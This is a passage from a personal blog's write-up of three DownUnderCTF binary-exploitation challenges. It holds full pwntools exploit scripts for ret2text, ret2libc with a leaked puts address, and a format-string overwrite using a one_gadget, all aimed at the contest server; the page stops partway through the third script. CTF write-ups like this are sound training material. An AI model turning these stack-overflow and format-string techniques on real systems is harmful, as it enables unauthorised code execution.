<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>wp DownUnderCTF | I0gan's blog</title><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script>var config = {"root":"/","path":""}</script><script src="//unpkg.com/mermaid@8.13.5/dist/mermaid.min.js"></script><script>mermaid.initialize({
 startOnLoad: true
 , theme: 'dark'
});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.4.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body style="background-image:url(https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg);"><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/shell/"><span class="navItemTitle">Shell</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>wp DownUnderCTF</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2020-09-21T16:32:31.000Z" id="date"> 2020-09-22</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-04-30T14:13:19.560Z" id="updated"> 2022-04-30</time></div></span><br><span>Word Count: <div class="control">5.3k</div></span><br><span>Read Time: <div class="control">33 min</div></span></div></div><hr><div id="post-content"><h1 id="DownUnderCTF-PWN-WP"><a href="#DownUnderCTF-PWN-WP" class="headerlink" title="DownUnderCTF PWN WP"></a>DownUnderCTF PWN WP</h1><p><a target="_blank" rel="noopener" href="https://play.duc.tf/login?next=/team?next=%252Fchallenges%253F#added%20protection-63">platform</a></p>
<h2 id="1-shellthis"><a href="#1-shellthis" class="headerlink" title="1 [shellthis]"></a>1 [shellthis]</h2><p>There is a backdoor function named get_shell, then use ret2txt way to get shell</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># author: i0gan</span><br><span class="hljs-comment"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf_path  = <span class="hljs-string">&#x27;pwn&#x27;</span><br>MODIFY_LD = <span class="hljs-number">0</span><br>arch = <span class="hljs-string">&#x27;64&#x27;</span><br>libc_v = <span class="hljs-string">&#x27;2.23&#x27;</span><br><br>ld_path   = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span><br>libs_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><br><span class="hljs-comment"># change ld path </span><br><span class="hljs-keyword">if</span>(MODIFY_LD):<br>	os.system(<span class="hljs-string">&#x27;cp &#x27;</span> + elf_path + <span class="hljs-string">&#x27; &#x27;</span> + elf_path + <span class="hljs-string">&#x27;.bk&#x27;</span>)<br>	change_ld_cmd = <span class="hljs-string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="hljs-string">&#x27; &#x27;</span> + elf_path<br>	os.system(change_ld_cmd)<br>	li(<span class="hljs-string">&#x27;modify ld ok!&#x27;</span>)<br>	exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;chal.duc.tf&quot;</span><br>server_port = <span class="hljs-number">30002</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">0</span><br><br><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	p = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x30</span><br>	p += p64(<span class="hljs-number">0</span>)<br>	p += p64(elf.sym[<span class="hljs-string">&#x27;get_shell&#x27;</span>])<br>	sl(p)<br>	<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )<br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )<br>	<br>	<span class="hljs-keyword">else</span>:<br>		elf = ELF(elf_path)<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br><br>	exploit()<br>	finish()<br><br></code></pre></td></tr></table></figure>





<h2 id="2-return-to-what"><a href="#2-return-to-what" class="headerlink" title="2 [return-to-what]"></a>2 [return-to-what]</h2><p>This vuln </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-30h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Where would you like to return to?&quot;</span>);<br>  <span class="hljs-keyword">return</span> gets(&amp;v1);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>This vuln is a common stack overflow vuln, but no backdoor function we can use. we should leak libc base address before program end, then use ret2libc methond to call system function to get shell.</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># author: i0gan</span><br><span class="hljs-comment"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf_path  = <span class="hljs-string">&#x27;./return-to-what&#x27;</span><br>MODIFY_LD = <span class="hljs-number">0</span><br>arch = <span class="hljs-string">&#x27;64&#x27;</span><br>libc_v = <span class="hljs-string">&#x27;2.23&#x27;</span><br><br>ld_path   = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span><br>libs_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><br><span class="hljs-comment"># change ld path </span><br><span class="hljs-keyword">if</span>(MODIFY_LD):<br>	os.system(<span class="hljs-string">&#x27;cp &#x27;</span> + elf_path + <span class="hljs-string">&#x27; &#x27;</span> + elf_path + <span class="hljs-string">&#x27;.bk&#x27;</span>)<br>	change_ld_cmd = <span class="hljs-string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="hljs-string">&#x27; &#x27;</span> + elf_path<br>	os.system(change_ld_cmd)<br>	li(<span class="hljs-string">&#x27;modify ld ok!&#x27;</span>)<br>	exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;chal.duc.tf&quot;</span><br>server_port = <span class="hljs-number">30003</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">0</span><br><br><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	pop_rdi = <span class="hljs-number">0x040122b</span><br>	ret = <span class="hljs-number">0x0401016</span><br>	p = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x30</span><br>	p += p64(<span class="hljs-number">0</span>)<br>	p += p64(pop_rdi)<br>	p += p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>	p += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>	p += p64(<span class="hljs-number">0x4011AD</span>)<br>	db()<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, p)<br>	leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">b&#x27;\x7f\x00\x00&#x27;</span>)<br>	li(<span class="hljs-string">&#x27;leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(leak))<br>	libc_base = leak - <span class="hljs-number">0x0809c0</span><br>	li(<span class="hljs-string">&#x27;lib_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	system = libc_base + <span class="hljs-number">0x04f440</span><br>	sh_str = libc_base + <span class="hljs-number">0x1b3e9a</span><br>	p = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x30</span><br>	p += p64(<span class="hljs-number">0</span>)<br>	p += p64(ret)<br>	p += p64(pop_rdi)<br>	p += p64(sh_str)<br>	p += p64(system)<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, p)<br>	<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )<br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )<br>	<br>	<span class="hljs-keyword">else</span>:<br>		elf = ELF(elf_path)<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br><br>	exploit()<br>	finish()<br></code></pre></td></tr></table></figure>







<h2 id="3-echos"><a href="#3-echos" class="headerlink" title="3 [echos]"></a>3 [echos]</h2><p>This program is a echo server, to print what you input. It’s easy to find a vulnerability in this program.It is format vul. we need use this vulnerability to leak main function return address in stack and leak libc base address.  Use libc database to search libc version by countent of leak then to download it. a one_gadget tool is very useful tool for searching one gadget in libc.  In order to get shell we should modify main ret address in stack as one gadget</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># author: i0gan</span><br><span class="hljs-comment"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><br>elf_path  = <span class="hljs-string">&#x27;./echos.bk&#x27;</span><br>MODIFY_LD = <span class="hljs-number">0</span><br>arch = <span class="hljs-string">&#x27;64&#x27;</span><br>libc_v = <span class="hljs-string">&#x27;2.27&#x27;</span><br><br>ld_path   = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span><br>libs_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><br><span class="hljs-comment"># change ld path </span><br><span class="hljs-keyword">if</span>(MODIFY_LD):<br>	os.system(<span class="hljs-string">&#x27;cp &#x27;</span> + elf_path + <span class="hljs-string">&#x27; &#x27;</span> + elf_path + <span class="hljs-string">&#x27;.bk&#x27;</span>)<br>	change_ld_cmd = <span class="hljs-string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="hljs-string">&#x27; &#x27;</span> + elf_path<br>	os.system(change_ld_cmd)<br>	li(<span class="hljs-string">&#x27;modify ld ok!&#x27;</span>)<br>	exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;chal.duc.tf&quot;</span><br>server_port = <span class="hljs-number">30001</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">0</span><br><br><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	offset = <span class="hljs-number">8</span><br>	p = <span class="hljs-string">&#x27;%11$p,%27$p,%19$p&#x27;</span><br><br>	sl(p)<br>	ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>	leak = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>	elf_base = leak - (<span class="hljs-number">0x563d9cb8e8dd</span> - <span class="hljs-number">0x563d9cb8e000</span>)<br>	li(<span class="hljs-string">&#x27;elf_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(elf_base))<br><br>	<span class="hljs-comment"># leak stack base</span><br>	ru(<span class="hljs-string">&#x27;,0x&#x27;</span>)<br>	leak = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>	li(<span class="hljs-string">&#x27;stack_leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(leak))<br>	main_ret = leak - (<span class="hljs-number">0x7ffc1f9e87e0</span> - <span class="hljs-number">0x7ffc1f9e8708</span>)<br>	li(<span class="hljs-string">&#x27;main_ret: &#x27;</span> + <span class="hljs-built_in">hex</span>(main_ret))<br><br>	ru(<span class="hljs-string">&#x27;,0x&#x27;</span>)<br>	leak = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>	li(<span class="hljs-string">&#x27;main_init_leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(leak - <span class="hljs-number">231</span>))<br>	db()<br>	libc_base = leak - (<span class="hljs-number">0x7f7d13204b97</span> - <span class="hljs-number">0x7f7d131e3000</span>)<br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	one_gadget = libc_base + <span class="hljs-number">0x4f322</span><br>		<br><br>	p = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>((one_gadget &amp; <span class="hljs-number">0xFF0000</span>) &gt;&gt; <span class="hljs-number">16</span>) + <span class="hljs-string">&#x27;c%10$hhn&#x27;</span><br>	p += <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">4</span><br>	p += p64(main_ret + <span class="hljs-number">2</span>) <span class="hljs-comment">#0xF0000</span><br>	li(<span class="hljs-string">&#x27;one_gadget: &#x27;</span> + <span class="hljs-built_in">hex</span>(one_gadget))<br>	<span class="hljs-comment">#db()</span><br>	sl(p)<br><br>	ru(<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>	p = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(one_gadget &amp; <span class="hljs-number">0xFFFF</span>) + <span class="hljs-string">&#x27;c%10$hn&#x27;</span><br>	p += <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">3</span><br>	p += p64(main_ret + <span class="hljs-number">0</span>) <span class="hljs-comment">#0xF0000</span><br>	sl(p)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )<br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process(env = &#123;<span 